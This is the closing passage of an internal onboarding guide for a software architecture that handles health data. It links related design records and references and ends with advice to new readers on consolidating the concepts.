- [ADR-303](../ADRs/303-phi-sync-and-backup-via-e2ee.md) — how sync/backup preserve the boundary.

**Before you actually build a feature:**

- [feature-development.md](./feature-development.md) — the checklist. This guide was step 1 (concepts). That guide is step 2 (process).
- [disposable-pattern.md](./disposable-pattern.md) — the cleanup convention you'll use everywhere.

**To see the prior art:**

- [References/VSCode_Architecture_Case_Study.md](../References/VSCode_Architecture_Case_Study.md) — what we borrowed and why.
- [References/Core_Shell_vs_First_Party_Bundle_Reasoning.md](../References/Core_Shell_vs_First_Party_Bundle_Reasoning.md) — why most features ship as bundles, not as shell code.

---

## Closing note for new readers

If after reading this you can answer the quiz questions and the misconceptions section feels like a list of "yes, obviously"s, you have the mental model.

If parts still feel fuzzy — particularly the bundle-spans-two-processes idea, or the "capability is just a name" idea — that's normal. Re-read §7 (the worked example) tracing each step on the diagram in §5. The concepts click when you watch them move.

The architecture is opinionated. The opinions exist because the alternative — a free-form Electron app handling PHI — has known failure modes that have hurt other products in this space. Every concept in this guide is an antibody against a specific failure. When something feels like extra work, that's the antibody doing its job.
